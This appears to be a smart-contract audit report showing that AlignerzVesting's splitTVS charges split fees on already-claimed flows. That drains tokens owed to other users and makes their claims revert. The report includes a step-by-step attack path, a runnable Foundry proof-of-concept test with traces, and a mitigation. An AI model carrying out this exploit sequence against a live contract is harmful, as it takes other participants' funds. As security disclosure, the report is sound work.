# [000466] The `splitTVS` function incorrectly calculates split fee from the already claimed nft flows, and incorrectly charges it from protocol balance which ultimately leads to the loss of funds and broken claim functionality.
  
  ### Summary

The `splitTVS` function in `AlignerzVesting` contract splits an NFT (TVS) into two or more NFTS by splitting all of the flows of the NFT.
The function charges split fee from only the NFT being split, not the new ones which are being minted. But there is a critical flaw in fee accounting.
While calculating and charging the split fee, the function doesn't check if the flows of the `splitNftId` (the original) NFT are already completely claimed or not, it just calculates the fee from every flow and transfers the total calculated amount from the contract to the treasury. Because from the flows which are completely claimed, the tokens are already transferred to the owner of NFT, this extra calculated fee is charged from the protocol balance and sent to the `treasury` effectively lowering the balance of the pool which should have been used to satisfy other users’ claims of tokens.

The flaw completely breaks the `claimTokens` functionality because the **total balance of the protocol becomes lower the the required amount to be sent to the users.**

### Root Cause

The root cause of this issue is not checking if all the flows of the nft being split are completely claimed or not, check:-
```solidity
 function splitTVS(uint256 projectId, uint256[] calldata percentages, uint256 splitNftId)
        external
        returns (uint256, uint256[] memory)
    {
        address nftOwner = nftContract.extOwnerOf(splitNftId);
        require(msg.sender == nftOwner, Caller_Should_Own_The_NFT());

        bool isBiddingProject = NFTBelongsToBiddingProject[splitNftId];
        (Allocation storage allocation, IERC20 token) = isBiddingProject
            ? (biddingProjects[projectId].allocations[splitNftId], biddingProjects[projectId].token)
            : (rewardProjects[projectId].allocations[splitNftId], rewardProjects[projectId].token);

        uint256[] memory amounts = allocation.amounts;
        uint256 nbOfFlows = allocation.amounts.length;

@>        (uint256 feeAmount, uint256[] memory newAmounts) =
            calculateFeeAndNewAmountForOneTVS(splitFeeRate, amounts, nbOfFlows);
@>        allocation.amounts = newAmounts;
        token.safeTransfer(treasury, feeAmount);
       //----rest of the logic
}
```

### Internal Pre-conditions

- `Split fee rate` should be set more than 0.

### External Pre-conditions

N/A

### Attack Path

1. Actors involved:-
- `Protocol admin`
- `Alice`
- `Bob`
- `Thomas`

2. Attack path

- `Admin` sets split `fee == 200`, %2
- `Admin` launches a `biddingProject` with 3 thousand tokens to vest
- Admin creates pool 0
- All of the users, `Alice`, `Bob`, and `Thomas` place bids with same amount of tokens and different amount of timing to vest.
- `Alice` and `Thomas` vest for 180 days, while `Bob` vests for 90 days.
- all of them gets their bids accepted and they recieve 1 thousand tokens each (to be vested).
- Now, `Bob` sells his Nft to `Thomas`.
- `Thomas` merges both of these NFTs together.
- After 90 days, `Thomas` claims all of `Bob`'s nft tokens which he bought from `Bob` and half of his nft's tokens.
- Now, `Thomas` splits  his NFT into two Nfts.
- Because the 2nd flow in the `Thomas`'s (the flow created by merging bob's nft into his own nft) nft was completely claimed, the split tvs function still calculates fee from this flow.
- Because `Thomas` already claimed 2nd flow's all tokens, the calculated fee is charged from the protocol's token balance effectively lowering the total amount of tokens. Now the protocol token balance is less than amount to be claimed by all the bidders.
- After 180 days, `Thomas` claims his both Nfts claiming full amount. 
- `Alice` also calls `claimTokens` to claim her nft, but because the balance of the contract became less than the required amount, the function reverts, effectively halting the execution.

### Impact

1. **Fee is incorrectly charged on already-claimed flows**, causing the protocol to deduct split fees from the global token pool instead of skpping.
2. **Silent value theft**: a user can claim their flows, transfer the NFT, and the next split will still charge fees on those claimed flows — effectively stealing value/griefing from other users’ unclaimed balances.
3. **Cross-user fund leakage**: split fees are paid using tokens that belong to other vesting participants, breaking isolation between user allocations.
4. **Incorrect state accounting**: the protocol reduces `amounts[]` allocation even for flows that have claimed `status == true`, corrupting the total protocol tokens value.
5. **Denial of service**: later users’ `claimTokens()` calls revert because the contract no longer has enough tokens to satisfy their pending claims.
6. **Permanent loss of user funds**: affected users cannot recover their missing tokens; the system considers them claimable but the tokens have already been transferred to the treasury as an incorrect fee.
7. **Chainable exploitation**: repeated splits of partially claimed NFTs amplify the imbalance, enabling attackers to drain treasury-sourced or user-sourced value over multiple operations.

**Severity - HIGH**

### PoC

- To run the PoC, i modified the `calculateFeeAndNewAmountForOneTVS` function because of broken loop, uninitialized array and fee assimilation issues. Please modify the function as follows to run the PoC:-
```solidity
    function calculateFeeAndNewAmountForOneTVS(uint256 feeRate, uint256[] memory amounts, uint256 length)
        public
        pure
        returns (uint256 feeAmount, uint256[] memory newAmounts)
    {
        require(amounts.length == length);
        newAmounts = new uint256[](length);
        for (uint256 i; i < length; i++) {
            uint256 fee = calculateFeeAmount(feeRate, amounts[i]);
            feeAmount += fee;
            newAmounts[i] = amounts[i] - fee;
        }
    }
```
- To run the PoC, i have also modified the `_computeSplitArrays` function because of the out of bound array (uninitialized array) acces error, please modify as follows:-
```solidity
//use memory instead of storage in allocation struct
function _computeSplitArrays(Allocation memory allocation, uint256 percentage, uint256 nbOfFlows)
        internal
        view
        returns (Allocation memory alloc)
    {
        uint256[] memory baseAmounts = allocation.amounts;
        uint256[] memory baseVestings = allocation.vestingPeriods;
        uint256[] memory baseVestingStartTimes = allocation.vestingStartTimes;
        uint256[] memory baseClaimed = allocation.claimedSeconds;
        bool[] memory baseClaimedFlows = allocation.claimedFlows;
       
       //address this sanity check
        require(
            nbOfFlows == baseAmounts.length && nbOfFlows == baseVestings.length
                && nbOfFlows == baseVestingStartTimes.length && nbOfFlows == baseClaimed.length
                && nbOfFlows == baseClaimedFlows.length,
            "Invalid nbOfFlows"
        );
       
       //added these to get rid of out of bound array acces error
        alloc.amounts = new uint256[](nbOfFlows);
        alloc.vestingPeriods = new uint256[](nbOfFlows);
        alloc.vestingStartTimes = new uint256[](nbOfFlows);
        alloc.claimedSeconds = new uint256[](nbOfFlows);
        alloc.claimedFlows = new bool[](nbOfFlows);

        alloc.assignedPoolId = allocation.assignedPoolId;
        alloc.token = allocation.token;

        for (uint256 j; j < nbOfFlows;) {
            alloc.amounts[j] = (baseAmounts[j] * percentage) / BASIS_POINT;
            alloc.vestingPeriods[j] = baseVestings[j];
            alloc.vestingStartTimes[j] = baseVestingStartTimes[j];
            alloc.claimedSeconds[j] = baseClaimed[j];
            alloc.claimedFlows[j] = baseClaimedFlows[j];
            unchecked {
                ++j;
            }
        }
    }
``` 
- To run the PoC, i have also modified the `splitTVS` function because of **allocation struct storage pointer mutation issue** (already submitted a separate issue for this), PoC can't be made without this modification:-
```solidity
function splitTVS(...)
        external
        returns (uint256, uint256[] memory)
    {
        address nftOwner = nftContract.extOwnerOf(splitNftId);
        require(msg.sender == nftOwner, Caller_Should_Own_The_NFT());

        bool isBiddingProject = NFTBelongsToBiddingProject[splitNftId];
        (Allocation storage allocation, IERC20 token) = isBiddingProject
            ? (biddingProjects[projectId].allocations[splitNftId], biddingProjects[projectId].token)
            : (rewardProjects[projectId].allocations[splitNftId], rewardProjects[projectId].token);

        uint256[] memory amounts = allocation.amounts;
        uint256 nbOfFlows = allocation.amounts.length;

        (uint256 feeAmount, uint256[] memory newAmounts) =
            calculateFeeAndNewAmountForOneTVS(splitFeeRate, amounts, nbOfFlows);
        allocation.amounts = newAmounts;
        token.safeTransfer(treasury, feeAmount);

        uint256 nbOfTVS = percentages.length;

        // new NFT IDs except the original one
        uint256[] memory newNftIds = new uint256[](nbOfTVS - 1);

        // Allocate outer arrays for the event
        Allocation[] memory allAlloc = new Allocation[](nbOfTVS);

        Allocation memory malloc = allocation; //use snapshot of allocation

        uint256 sumOfPercentages;
        for (uint256 i; i < nbOfTVS;) {
            uint256 percentage = percentages[i];
            sumOfPercentages += percentage;

            uint256 nftId = i == 0 ? splitNftId : nftContract.mint(msg.sender);
            if (i != 0) newNftIds[i - 1] = nftId;
            Allocation memory alloc = _computeSplitArrays(malloc, percentage, nbOfFlows); //provide snapshot here in _compute function instead of storage pointer
            NFTBelongsToBiddingProject[nftId] = isBiddingProject ? true : false;
            Allocation storage newAlloc = isBiddingProject
                ? biddingProjects[projectId].allocations[nftId]
                : rewardProjects[projectId].allocations[nftId];
            _assignAllocation(newAlloc, alloc);
          // ---rest of the logic will remain same
}
```
- Now copy/paste the given test in `AlignerzVestingProtocolTest.t.sol` test suite and run with command `forge test --mt test_FeeChargingInSplitTVSfromClaimedFlowsPoC -vvvv`.
```solidity
unction test_FeeChargingInSplitTVSfromClaimedFlowsPoC() public {
        //set split fees
        vm.prank(projectCreator);
        vesting.setSplitFeeRate(200); //%2
        address alice = makeAddr("Alice");
        address thomas = makeAddr("Thomas");
        address bob = makeAddr("Bob");
        //deal tokens to the users, 1 thousand tokens to each
        deal(address(usdt), alice, 1000e6);
        deal(address(usdt), thomas, 1000e6);
        deal(address(usdt), bob, 1000e6);
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        // Setup the project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(
            address(token), address(usdt), block.timestamp, block.timestamp + 1000_000 days, "0x0", false
        );
        ///creating a pool with 3 thousand tokens and 1 usdt price per token
        vesting.createPool(0, 3000 ether, 1e6, false);
        vm.stopPrank();

        console.log("protocol balance of token now:", token.balanceOf(address(vesting)));
        /// Place bids for the project
        //all of the users place equal bids to get same amount of tokens allocated
        //using blocks to get rid of stack too deep errors
        {
            vm.startPrank(alice);
            usdt.approve(address(vesting), 1000e6);
            vesting.placeBid(0, 1000e6, 180 days);
            vm.stopPrank();

            vm.startPrank(thomas);
            usdt.approve(address(vesting), 1000e6);
            vesting.placeBid(0, 1000e6, 180 days);
            vm.stopPrank();

            vm.startPrank(bob);
            usdt.approve(address(vesting), 1000e6);
            vesting.placeBid(0, 1000e6, 90 days);
            vm.stopPrank();
        }

        //Create bind info to generate merkle proofs
        BidInfo[] memory allBids = new BidInfo[](3);

        /// Simulate off-chain allocation process
        // For simplicity, all bids are the same amount
        allBids[0] = BidInfo({bidder: alice, amount: 1000 ether, vestingPeriod: 180 days, poolId: 0, accepted: true});
        allBids[1] = BidInfo({bidder: thomas, amount: 1000 ether, vestingPeriod: 180 days, poolId: 0, accepted: true});
        allBids[2] = BidInfo({bidder: bob, amount: 1000 ether, vestingPeriod: 90 days, poolId: 0, accepted: true});

        bytes32[] memory poolRoot = new bytes32[](1);
        poolRoot[0] = generateMerkleProofs(allBids, 0);

        //finalize bids
        vm.startPrank(projectCreator);
        vesting.finalizeBids(0, bytes32(0), poolRoot, 30 days);
        vm.stopPrank();

        ///users cliam nfts
        vm.prank(alice);
        uint256 nftIdAlice = vesting.claimNFT(0, 0, 1000 ether, bidderProofs[alice]);
        assertEq(nft.ownerOf(nftIdAlice), alice);
        vm.prank(thomas);
        uint256 nftIdThomas = vesting.claimNFT(0, 0, 1000 ether, bidderProofs[thomas]);
        assertEq(nft.ownerOf(nftIdThomas), thomas);
        vm.prank(bob);
        uint256 nftIdBob = vesting.claimNFT(0, 0, 1000 ether, bidderProofs[bob]);
        assertEq(nft.ownerOf(nftIdBob), bob);

        ///Now simulating the behaviour when bob sells his nft to thomas
        vm.prank(bob);
        nft.approve(thomas, nftIdBob);

        vm.prank(thomas);
        nft.safeTransferFrom(bob, thomas, nftIdBob);
        assertEq(nft.ownerOf(nftIdBob), thomas);

        ///Now thomas merges his both of nfts together into one nft, with ID = 2
        //creating parameters required for merging nft
        uint256[] memory projectIds = new uint256[](1);
        projectIds[0] = 0;
        uint256[] memory nftIds = new uint256[](1);
        nftIds[0] = nftIdBob;

        vm.prank(thomas);
        vesting.mergeTVS(0, nftIdThomas, projectIds, nftIds); //thomas merges both nfts into one

        ///Now warping the timestamp so that bob's nft which he sold to thomas completely matures
        vm.warp(block.timestamp + 90 days);
        vm.prank(thomas); //thomas claims the matured flows of his nft (basically the flow created by merging his and bob's nft)
        vesting.claimTokens(0, nftIdThomas);

        /*Now here happens the issue when thomas splits his nft.
        Because thomas claimed the 2nd flow of his nft after merge,
        the tokens are transferred to him. Now splitting nft calculates
        fee even from the completely claimed flows. And because these
        tokens are already transferred to thomas, the fee calculated is
        charged from protocol balance, effectively lowering the total
        balance of protocol. And because the total balance token of the
        protocol is reduced incorrectly, the claimToken function reverts
        when users try to claim their token because of insufficient balance.*/

        //creating paramters required to split
        uint256[] memory percentages = new uint256[](2);
        percentages[0] = 5000; //50%
        percentages[1] = 5000; //50%

        vm.prank(thomas);
        (, uint256[] memory nftIdThomasNew) = vesting.splitTVS(0, percentages, nftIdThomas); //this call charges fee from claimed flows effectively lowering the total protocol balance

        console.log("protocol balance of token after thomas called split tvs:", token.balanceOf(address(vesting)));

        //warping timestamp 90 days more, total timestamp since project closed becomes 90 + 90 days = 180 days
        //Now all of the users try to claim their tokens
        vm.warp(block.timestamp + 90 days);

        vm.startPrank(thomas);
        vesting.claimTokens(0, nftIdThomas);
        vesting.claimTokens(0, nftIdThomasNew[0]); //thomas claims tokens from both his nfts
        vm.stopPrank();

        console.log("protocol balance of token after thomas made complete claim:", token.balanceOf(address(vesting)));

        vm.prank(alice);
        vm.expectRevert(); //this transaction will revert because of insufficient tokens in the contract
        vesting.claimTokens(0, nftIdAlice);
    }
```

**Logs:-**
```solidity
    ├─ [90202] ERC1967Proxy::fallback(0, 1)
    │   ├─ [89455] AlignerzVesting::claimTokens(0, 1) [delegatecall]
    │   │   ├─ [4318] AlignerzNFT::extOwnerOf(1) [staticcall]
    │   │   │   └─ ← [Return] Alice: [0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea]
    │   │   ├─ [20018] AlignerzNFT::burn(1)
    │   │   │   ├─ emit Approval(owner: Alice: [0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea], approved: 0x0000000000000000000000000000000000000000, tokenId: 1)
    │   │   │   ├─ emit Transfer(from: Alice: [0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea], to: 0x0000000000000000000000000000000000000000, tokenId: 1)
    │   │   │   └─ ← [Return]
    │   │   ├─ [3447] Aligners26::transfer(Alice: [0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea], 1000000000000000000000 [1e21])
    │   │   │   └─ ← [Revert] ERC20InsufficientBalance(0xc7183455a4C133Ae270771860664b6B7ec320bB1, 970000000000000000000 [9.7e20], 1000000000000000000000 [1e21])
    │   │   └─ ← [Revert] ERC20InsufficientBalance(0xc7183455a4C133Ae270771860664b6B7ec320bB1, 970000000000000000000 [9.7e20], 1000000000000000000000 [1e21])
    │   └─ ← [Revert] ERC20InsufficientBalance(0xc7183455a4C133Ae270771860664b6B7ec320bB1, 970000000000000000000 [9.7e20], 1000000000000000000000 [1e21])
    └─ ← [Return]
```

### Mitigation

To mitigate the issue, check the flow status of each NFT before calculating the fee. Also if possible, only charge the fee from unclaimed amount, not the full amount even if half of the amount is claimed. Add protportional fee calculation formula to calculate fee according to the non-released amount.
  